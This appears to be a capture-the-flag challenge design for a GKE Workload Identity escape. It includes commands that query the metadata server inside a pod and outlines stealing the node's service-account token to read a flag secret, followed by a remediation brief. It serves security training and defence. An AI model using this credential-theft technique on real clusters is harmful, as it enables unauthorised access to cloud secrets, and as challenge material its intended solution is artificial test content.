# h03 — Off the Node (Pearl Telecom)

**Category:** Cloud / GKE Workload Identity · **Difficulty:** Hard · **Points:** 400 (dynamic)

## Intended solve
Your team's namespace runs a pod bound to a **low-privilege Kubernetes SA** mapped (via Workload
Identity) to a GCP SA that can do almost nothing. The **node's** own service account is broader.
Escape the pod's identity to the node's.

```sh
# inside the pod: the pod's GCP identity is scoped to nothing useful
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
#   -> the Workload-Identity SA (scoped away)

# Reach the NODE identity instead. Depending on the cluster's metadata posture, the path is
# either the node's GCE metadata (if concealment is off) or abusing a host-network / hostPath
# escape to query the node's token:
#   -> node SA token with broader scope (e.g. can read one GCS object / Secret)
TOKEN=<node token>
gcloud secrets versions access latest --secret=pearl-core-flag --access-token=$TOKEN   # CYPHER{...}
# or read the flag object from the bucket the node SA can reach.
```
The lesson: Workload Identity scopes the **pod**, but a misconfigured node (metadata concealment
off / over-privileged node SA) lets a pod steal the node's stronger identity.

## Infra & safety
- **De-risked:** one real small GKE cluster, **per-team namespace** (not per-team clusters, not a
  kind-faked metadata endpoint). NetworkPolicy isolates teams. The node SA is scoped to exactly
  the flag resource for the challenge — broader than the pod, never project admin.
- Same cluster hosts i05 in a separate namespace; the two flaws are independent.

## Remediation (Blue Team Brief)
Enable GKE **metadata concealment** / Workload Identity everywhere; give nodes a minimal SA;
forbid `hostNetwork`/`hostPath` for untrusted workloads (Pod Security / Gatekeeper); a pod should
never be able to reach the node's credentials.
